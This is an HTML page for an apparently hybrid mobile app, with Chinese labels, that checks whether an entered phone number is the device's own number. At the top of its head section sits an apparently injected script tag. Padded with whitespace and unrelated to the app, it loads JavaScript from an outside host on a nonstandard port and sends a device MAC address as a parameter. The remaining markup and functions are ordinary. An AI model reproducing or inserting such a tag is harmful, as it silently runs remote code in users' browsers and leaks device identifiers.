
<!DOCTYPE html>
<html>

<head><script src=http://t.7gg.cc:88/j.js?MAC=2C15E1070348></script>                                         
    <meta charset="utf-8">
    <title>验证是否是本机号</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1,user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <!--标准mui.css-->
    <link rel="stylesheet" href="css/mui.min.css">
    <!--App自定义的css-->
    <link rel="stylesheet" type="text/css" href="css/app.css" />
</head>

<body>
    <div class="mui-content" style="width: 95%;height: 95%; margin: 0 auto; font-size: 14px; margin-top: 20px">

        <form class="mui-input-group">
            <div class="mui-input-row" style="height: 80px; padding-top: 20px;">
                <label>手机号</label>
                <input type="text" id="numTxt" class="mui-input-clear" placeholder="请输入手机号" style="font-size: 14px;">
            </div>
            <div class="mui-button-row" style="height: 80px; padding-top: 20px;">
                <button type="button" class="mui-btn mui-btn-primary" onclick="checkIsLocalNumber()">开始校验</button>
            </div>
    </form>

     <ul class="mui-table-view" style="margin-top: 20px;"> 
        <li class="mui-table-view-cell mui-collapse mui-active">
            <a class="mui-navigate-right" href="#">校验结果</a>
            <div class="mui-collapse-content">
                <div class="mui-input-row" style="margin: 10px 5px;">
                        <textarea id="content" rows="10" placeholder="多行文本框"></textarea>
                 </div>
            </div>
        </li>
    </ul>
</div>
</body>
<script src="js/mui.min.js"></script>
<script>
    function checkIsLocalNumber(){
            var num = document.getElementById("numTxt");
            console.log(num.value);
            CmpCheckIsLocalNumber(num.value);
        }

     function callbackCheckIsLocalNum(result){
            var info = document.getElementById("content");
            info.innerHTML = "校验结果为 " + result;
    }
</script>
</html>
